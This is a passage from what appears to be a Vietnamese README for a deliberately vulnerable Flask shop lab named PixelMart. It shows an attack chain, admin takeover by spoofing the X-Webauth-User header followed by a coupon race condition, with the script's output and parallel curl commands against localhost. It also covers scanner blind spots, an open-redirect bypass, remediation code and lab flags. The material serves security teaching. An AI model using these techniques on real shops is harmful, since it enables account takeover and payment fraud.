Ở chế độ 1, script sẽ tự động:
1. Gọi `GET /api/whoami` kèm header `X-Webauth-User: admin` tới chính
   `--url` (phải là cổng Flask, không phải cổng Nginx) để chiếm session
   admin và in ra flag của bước 1.
2. Dùng session đó gọi `GET /api/admin/coupon` để lấy mã giảm giá thật.
3. Đăng nhập **riêng** bằng tài khoản thường `--user`/`--password` (tài
   khoản mua hàng thật của attacker, tách biệt với session admin chiếm
   được ở bước 1-2).
4. Thêm 1 sản phẩm vào giỏ.
5. Dùng `threading` để bắn 20 request `apply-coupon` gần như đồng thời
   vào đúng race window (0.35s).
6. In ra số request thành công, trạng thái giỏ hàng, rồi tự gọi
   checkout để lấy giá cuối cùng và flag của bước 2.

**Kết quả thực tế khi test lab này** (threads=20):

```
=== Buoc 0: Khai thac lo hong gia mao header X-Webauth-User (CWE-290) ===
GET /api/whoami (header X-Webauth-User: admin) -> {'flag': 'LAB{reverse_proxy_trusted_header_admin_takeover_pixelmart}', 'logged_in': True, 'role': 'admin', 'username': 'admin'}
[+] FLAG (chiem doat session admin): LAB{reverse_proxy_trusted_header_admin_takeover_pixelmart}
[+] Lay duoc ma giam gia thuc cua admin: VIPB6C8DB (-20%)

[+] So request ap ma THANH CONG: 20 / 20

[+] Gio hang sau tan cong:
      coupon_uses  = 20   (ky vong neu AN TOAN: toi da 1)
      subtotal     = 1,200,000d
      discount     = 4,800,000d
      final_price  = 30,000d

[!!!] KHAI THAC THANH CONG: ma giam gia 'chi dung 1 lan' da bi cong don
      20 lan do race condition (TOCTOU)!

[+] Ket qua checkout: {'coupon_uses': 20, 'discount': 4800000,
    'final_price': 30000, 'flag': 'LAB{race_cond1tion_t0ctou_coupon_stack_pixelmart}',
    'ok': True, 'subtotal': 1200000, ...}
```

Toàn bộ giỏ hàng trị giá 1.200.000đ được mua với giá chỉ còn **30.000đ**
(bằng đúng phí vận chuyển, vì giảm giá đã vượt quá subtotal).

### Bước 5 (tuỳ chọn) — Khai thác thủ công bằng `curl` song song

Nếu muốn tự tay làm mà không cần Python, có thể dùng vòng lặp `curl`
chạy nền (độ chính xác thời gian kém hơn threading, nhưng vẫn có thể
khai thác được nhờ race window rộng 0.35s):

```bash
# Đăng nhập trước, lưu cookie
curl -s -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=tester&password=Password123!" -o /dev/null

# Thêm sản phẩm
curl -s -b cookies.txt -X POST http://localhost:5000/api/cart/add \
  -H "Content-Type: application/json" -d '{"product_id":1,"quantity":1}'

# Bắn 15 request áp mã song song (thay VIPxxxxxx bằng mã lấy được ở bước 4a)
for i in $(seq 1 15); do
  curl -s -b cookies.txt -X POST http://localhost:5000/api/cart/apply-coupon \
    -H "Content-Type: application/json" -d '{"code":"VIPxxxxxx"}' &
done
wait

# Kiểm tra giỏ hàng
curl -s -b cookies.txt http://localhost:5000/api/cart
```

---

## 5. Vì sao scanner tự động không phát hiện được

**Lỗ hổng #1 (giả mạo header reverse-proxy):**

- Đây không phải lỗi ở một endpoint cụ thể mà scanner có thể crawl tới
  và thử các payload khác nhau — nó nằm ở **tầng xác thực toàn cục**
  (`before_request`), chỉ lộ ra khi kết hợp đúng một header HTTP với
  việc gọi **trực tiếp tới một cổng khác** với cổng mà scanner thường
  được cấu hình để quét (scanner DAST thông thường chỉ quét một URL/cổng
  duy nhất được cung cấp, không tự dò thêm cổng khác của cùng host).
- Scanner không có khái niệm "kiến trúc triển khai có reverse proxy
  phía trước" — nó không biết để thử so sánh hành vi giữa việc gọi qua
  cổng công khai và gọi trực tiếp vào cổng nội bộ của app.
- Không có payload độc hại kiểu injection nào (không SQLi, không XSS)
  để scanner dựa vào signature — chỉ là một header HTTP hợp lệ về cú
  pháp với giá trị là một username có thật.
- Phát hiện được lỗi này đòi hỏi tư duy pentest hạ tầng/kiến trúc: quét
  cổng mở của host, nhận diện công nghệ (Nginx vs Flask dev server qua
  response header `Server`), và thử các tên header xác thực quen thuộc
  của những hệ thống dùng reverse-proxy auth — đây là kỹ thuật kiểm thử
  hạ tầng/network, không phải kiểm thử ứng dụng web thông thường mà
  phần lớn scanner DAST tập trung vào.

**Lỗ hổng #2 (race condition):**

- Mỗi request riêng lẻ đều là request hợp lệ: đúng xác thực (có
  session cookie), đúng định dạng JSON, đúng mã giảm giá thật.
- Không có payload độc hại (không SQLi, không XSS, không path
  traversal) để scanner dựa vào signature.
- Lỗi chỉ xuất hiện khi **nhiều request được gửi đúng thời điểm** —
  đây là hành vi mà scanner DAST thông thường (chạy tuần tự, mỗi lần
  một request) không mô phỏng.
- Cần tư duy nghiệp vụ: hiểu "coupon chỉ dùng 1 lần" là một ràng buộc
  logic, rồi tự đặt câu hỏi "ràng buộc này được thực thi nguyên tử hay
  không?" — đây là bước chỉ con người (hoặc công cụ chuyên biệt như
  Burp Turbo Intruder) mới làm được.

**Quan trọng hơn cả hai điểm trên:** scanner cũng sẽ không tự nhận ra
rằng chiếm được một session (dù qua cách gian lận) ở lỗ hổng #1 lại
chính là tiền đề cần thiết để khai thác có ý nghĩa lỗ hổng #2. Việc nối
hai lỗ hổng thuộc hai lớp hoàn toàn khác nhau (lỗi xác thực hạ tầng +
lỗi business logic) thành một chuỗi tấn công có ý nghĩa đòi hỏi tư duy
của người kiểm thử, không phải thứ scanner tự động nào tính đến.

## 5b. Audit bảo mật toàn bộ ứng dụng (ghi nhận lịch sử)

> Audit dưới đây được thực hiện **trước khi** lỗ hổng vượt quyền hiện
> tại (mục 2b) được thiết kế lại dưới dạng giả mạo header reverse-proxy.
> Tại thời điểm audit, mục tiêu là xác nhận lab **chỉ có 1 lỗ hổng**
> (race condition) — kết quả vẫn còn giá trị tham khảo cho toàn bộ phần
> code **không liên quan tầng xác thực/khu vực `/admin`**: các mục được
> đánh dấu AN TOÀN bên dưới không bị ảnh hưởng bởi những thay đổi sau
> này. Khu vực xác thực/`/admin` (được thiết kế lại nhiều lần sau đó,
> hiện chứa lỗ hổng giả mạo header có chủ đích) có mô tả riêng ở mục 2b.

Đã rà soát lại toàn bộ `app.py` và toàn bộ template (`templates/`) theo
các nhóm lỗi phổ biến: SQL injection, XSS/SSTI, IDOR/BOLA, CSRF, mass
assignment / thao túng giá, auth bypass, open redirect, information
disclosure, path traversal, rate limiting. Kết quả:

**Các mục đã kiểm tra và xác nhận AN TOÀN** (không phải lỗ hổng mới):

- **SQL injection**: toàn bộ query dùng placeholder `?` (parameterized),
  kể cả câu `LIKE` ở ô tìm kiếm trang chủ — phần nối chuỗi f-string chỉ
  ghép các mệnh đề `WHERE` *tĩnh* (không chứa dữ liệu người dùng), dữ
  liệu luôn đi qua `params`/placeholder.
- **XSS**: không có `|safe`, `Markup(...)`, hay `render_template_string`
  nào trong code; Jinja2 autoescape mặc định bật, nên review/comment,
  tên sản phẩm, địa chỉ giao hàng, flash message... đều được escape khi
  render.
- **IDOR**: `orders/<id>` kiểm tra `order_row["user_id"] != current_user_id()`
  → 404; giỏ hàng/review/profile luôn thao tác trên dữ liệu của chính
  user đang đăng nhập (lấy qua session), không nhận object id của người
  khác từ client.
- **Thao túng giá**: `subtotal`, `discount`, `shipping_fee`,
  `final_price` đều được **tính lại ở server** từ dữ liệu trong DB tại
  thời điểm checkout — client không gửi được giá trị tiền nào trực
  tiếp; `payment_method` được so khớp với whitelist `PAYMENT_METHODS`.
  Con đường duy nhất để thao túng tổng tiền vẫn là race condition ở
  coupon (mục đích của lab).
- **Debug mode / thông tin rò rỉ**: `debug=False`, không bật Werkzeug
  console; thông báo lỗi đăng nhập/đăng ký không tiết lộ chi tiết nội
  bộ (stack trace, đường dẫn...).
- **File/path traversal**: không có route tự phục vụ file theo tham số
  người dùng; ảnh sản phẩm phục vụ qua cơ chế `static` mặc định của
  Flask (đã có bảo vệ path traversal sẵn), tên file ảnh dựng từ
  `product.id` lấy ra từ DB chứ không phải input thô.

**2 vấn đề PHỤ phát hiện được (không liên quan race condition) — đã SỬA
ngay trong lần cập nhật này** để đảm bảo đúng tinh thần "1 lỗ hổng duy
nhất" của lab:

1. **Open Redirect (CWE-601)** ở `GET/POST /login?next=...`: điều kiện
   cũ `next_url.startswith("/")` tưởng là an toàn nhưng bị bypass bởi
   URL dạng *protocol-relative* như `next=//evil.com` — chuỗi này VẪN
   bắt đầu bằng `/` nhưng trình duyệt lại điều hướng sang host
   `evil.com`. Đã sửa bằng hàm `is_safe_redirect_target()`, dùng
   `urllib.parse.urlparse` để đảm bảo cả `scheme` và `netloc` đều rỗng
   trước khi redirect (chặn cả `//evil.com` lẫn `/\evil.com`).
2. **Username enumeration qua timing side-channel (CWE-208)** ở
   `POST /login`: code cũ `user is None or not check_password_hash(...)`
   sẽ **bỏ qua hoàn toàn bước hash** khi username không tồn tại (do
   short-circuit của `or`), khiến phản hồi cho "username không tồn
   tại" nhanh hơn rõ rệt so với "username đúng, mật khẩu sai" — kẻ tấn
   công có thể dò được username hợp lệ bằng cách đo thời gian phản hồi.
   Đã sửa để **luôn gọi `check_password_hash`** (dùng một hash giả cố
   định, tạo một lần lúc khởi động, khi user không tồn tại), giúp thời
   gian phản hồi gần như không đổi giữa 2 trường hợp.

Cả hai đều là lỗi thật nhưng ở mức độ **phụ/harden** (không cho phép
trực tiếp đọc/sửa dữ liệu người khác hay chiếm quyền), khác hẳn về bản
chất với lỗ hổng race condition chính (CWE-367) — vốn cho phép **phá vỡ
trực tiếp logic nghiệp vụ** (coupon dùng-một-lần bị cộng dồn vô hạn lần,
dẫn đến giảm giá sai và có thể thanh toán gần như 0đ). Sau khi sửa, lab
chỉ còn đúng **một lỗ hổng có thể khai thác theo kịch bản chính** —
race condition ở coupon — các mục còn lại đều đã được đóng.

**Các điểm "harden thêm nếu triển khai thật" nhưng KHÔNG sửa trong lab**
(giữ nguyên để không làm lệch trọng tâm bài tập, và vì bản thân chúng
không phải lỗ hổng khai thác được theo đúng nghĩa trong ngữ cảnh lab
này):

- Không có CSRF token trên các form/API thay đổi trạng thái. Rủi ro
  thực tế được giảm đáng kể vì (a) mọi hành động thay đổi dữ liệu đều
  là `POST` (không có GET nào làm thay đổi trạng thái, trừ `/logout`
  — vô hại), và (b) cookie session của Flask không khai báo
  `SameSite=None`, nên trình duyệt hiện đại áp dụng mặc định
  `SameSite=Lax`, chặn cookie bị gửi kèm trong POST cross-site thông
  thường. Nếu triển khai thật, vẫn nên thêm CSRF token (vd.
  `flask-wtf`) làm lớp phòng thủ sâu (defense-in-depth).
- Không có rate limiting / khoá tài khoản sau nhiều lần đăng nhập sai
  → có thể bị brute-force mật khẩu nếu chạy thật trên Internet.
- Không có header bảo mật như `X-Frame-Options`/`Content-Security-Policy`
  → về lý thuyết có thể bị clickjacking (dẫn dụ người dùng click nhầm
  qua iframe ẩn).
- Trang đăng ký trả lỗi rõ ràng "Tên đăng nhập đã tồn tại" (409) — đây
  là UX chuẩn cho form đăng ký, nhưng cũng đồng nghĩa có thể dò được
  username đã đăng ký (register-time enumeration), khác với lỗi timing
  ở `/login` đã nêu trên.
- `app.secret_key` được random mỗi lần khởi động tiến trình (không lưu
  cố định) — không phải lỗ hổng (ngược lại, tránh hardcode secret key),
  nhưng có nghĩa là mọi session sẽ mất hiệu lực mỗi khi container
  restart — là hành vi vận hành cần biết, không phải vấn đề bảo mật.

## 6. Hướng khắc phục (remediation) — để hiểu bản chất lỗi

Lỗi gốc của race condition là thiếu tính nguyên tử. Cách sửa đúng là
gộp bước kiểm tra và ghi nhận vào **một UPDATE có điều kiện**, dựa vào
`rowcount` để biết có thực sự là request đầu tiên hay không:

```python
# Sửa đúng: UPDATE có điều kiện, kiểm tra rowcount thay vì SELECT rồi UPDATE riêng
cursor = db.execute(
    "UPDATE carts SET coupon_applied = 1, coupon_uses = coupon_uses + 1 "
    "WHERE id = ? AND coupon_applied = 0",
    (cart_id,),
)
db.commit()
if cursor.rowcount == 0:
    return jsonify({"error": "coupon already applied"}), 409
```

Cách này đảm bảo chỉ **đúng một** request trong số các request chạy
song song có thể làm thay đổi `coupon_applied` từ 0 → 1, vì SQLite
(và hầu hết RDBMS) tự khóa dòng dữ liệu trong một câu UPDATE đơn lẻ.

### Khắc phục lỗ hổng #1 (giả mạo header reverse-proxy)

Cách sửa **triệt để nhất** là loại bỏ hẳn kiến trúc gây ra vấn đề:
**không publish cổng của Flask ra host nữa**. Trong `docker-compose.yml`,
chỉ cần xoá phần `ports` của service `web`:

```yaml
services:
  web:
    build: .
    # KHONG con "ports: - 5000:5000" nua - chi mang noi bo cua
    # docker-compose moi cham toi duoc service nay
    expose:
      - "5000"
  proxy:
    image: nginx:1.27-alpine
    ports:
      - "80:80"
    volumes:
      - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro
```

Khi đó, **chỉ Nginx** mới gọi được tới Flask (qua mạng nội bộ
`pixelmart_default` của docker-compose), và vì Nginx đã xoá trắng
header `X-Webauth-User` trên mọi request đi qua nó, cơ chế trust-header
trở nên an toàn trở lại — đúng với giả định ban đầu của nó.

Nếu vì lý do nào đó vẫn cần giữ cổng Flask mở ra ngoài (vd. để debug),
nên có **lớp bảo vệ thứ hai** ngay trong code, không chỉ dựa vào cấu
hình hạ tầng:

```python
import ipaddress

TRUSTED_PROXY_IPS = {"172.18.0.0/16"}  # subnet noi bo cua docker-compose

def try_trusted_proxy_login():
    if current_user_id():
        return
    header_user = request.headers.get(TRUSTED_PROXY_AUTH_HEADER)
    if not header_user:
        return
    # SUA: chi tin tuong header NEU request den tu dia chi cua proxy
    remote_ip = ipaddress.ip_address(request.remote_addr)
    if not any(remote_ip in ipaddress.ip_network(net) for net in TRUSTED_PROXY_IPS):
        return
    ...
```

Bài học quan trọng hơn cả 2 cách sửa trên: **đừng bao giờ coi một "quy
tắc hạ tầng" (chỉ proxy mới gọi được tới app) là điều kiện an toàn đủ
mạnh nếu không có cách nào ở tầng ứng dụng để TỰ KIỂM TRA điều đó** —
một thay đổi port-mapping tưởng vô hại (thêm vào để debug, rồi quên
xoá) đủ để phá vỡ hoàn toàn mô hình an toàn, nếu không có lớp phòng thủ
thứ hai.

### Khắc phục lỗ hổng #2 (race condition) — xem đầu mục 6

Áp dụng UPDATE có điều kiện như mô tả ở đầu mục này cho
`/api/cart/apply-coupon`.

### Khắc phục chuỗi tấn công nói chung (mục 2c)

Ngoài việc sửa từng lỗ hổng riêng lẻ, điểm thiết kế đáng rút ra là: một
dữ liệu "bí mật" (mã giảm giá) không nên được coi là an toàn chỉ vì nó
"khó đoán" (sinh ngẫu nhiên) — nếu tồn tại BẤT KỲ con đường chiếm được
quyền truy cập hợp pháp vào nó (dù là qua một lỗ hổng ở tầng khác hẳn,
như xác thực hạ tầng), toàn bộ cơ chế dựa vào tính bí mật đó (ở đây là
ràng buộc nghiệp vụ "dùng một lần") đều có thể bị vòng qua. Phòng thủ
theo chiều sâu nghĩa là: ngay cả khi lỗ hổng giả mạo header được vá
đúng cách, cơ chế race condition ở `/api/cart/apply-coupon` **vẫn nên
được sửa độc lập** — không nên để an toàn của tính năng B phụ thuộc
vào việc tính năng A không bao giờ bị lộ.

---

## 7. Cấu trúc thư mục

```
pixelmart/
├── app.py                   # Flask app (chứa lỗ hổng + comment giải thích)
├── requirements.txt
├── Dockerfile
├── docker-compose.yml        # 2 service: web (Flask, cong 5000 - xem muc 2b)
│                               # va proxy (Nginx, cong 80)
├── nginx.conf                 # cau hinh reverse proxy - xoa header
│                               # X-Webauth-User tren moi request (dung cach)
├── entrypoint.sh             # reset DB mỗi lần container start
├── templates/
│   ├── base.html             # layout chung (header, nav, flash message)
│   ├── login.html
│   ├── register.html
│   ├── home.html              # trang chủ: lưới sản phẩm + tìm kiếm/lọc
│   ├── product_detail.html    # chi tiết sản phẩm + đánh giá
│   ├── cart.html               # giỏ hàng + áp mã + thanh toán
│   ├── profile.html            # thông tin cá nhân + đổi mật khẩu
│   ├── orders.html             # danh sách đơn hàng (có trạng thái)
│   ├── order_detail.html       # chi tiết 1 đơn hàng (phí ship, thanh toán, trạng thái, xác minh)
│   ├── admin_dashboard.html    # bảng điều khiển quản trị (chỉ role=admin,
│   │                             # gồm khối mã giảm giá đang hoạt động)
│   ├── admin_orders.html       # quản lý/xác minh thanh toán đơn hàng (chỉ role=admin)
│   ├── about.html, policy.html, contact.html  # trang tĩnh (trust signal)
│   ├── 404.html
│   └── 500.html
├── static/
│   ├── style.css              # toàn bộ theme giao diện (thuần CSS)
│   ├── products/               # ảnh sản phẩm sinh offline (p<id>_1/2/3.jpg)
│   └── js/
│       ├── admin-orders.js    # JS cho trang /admin/orders - CÔNG KHAI,
│       │                         # API bên dưới đã được bảo vệ đúng cách
│       └── admin-coupon.js    # JS cho khối mã giảm giá ở /admin - goi
│                                 # GET /api/admin/coupon (API nay dung,
│                                 # xem muc 2b/2c ve cach bi lam dung)
└── exploit/
    ├── race_coupon.py          # khai thác lỗ hổng #2 (race condition);
    │                             # tự động chiếm session admin qua header
    │                             # (--spoof-admin-header) neu khong truyen
    │                             # --code (chuỗi tấn công đầy đủ)
    └── spoof_admin_header.py   # khai thác riêng lỗ hổng #1 (giả mạo
                                   # header X-Webauth-User, CWE-290) - chỉ
                                   # dừng ở bước chiếm session, không race
```

**Cảnh báo:** chỉ chạy lab này trong môi trường cô lập (máy cá nhân/VM
nội bộ), không expose cổng 5000 (hay cổng 80) ra Internet công khai.
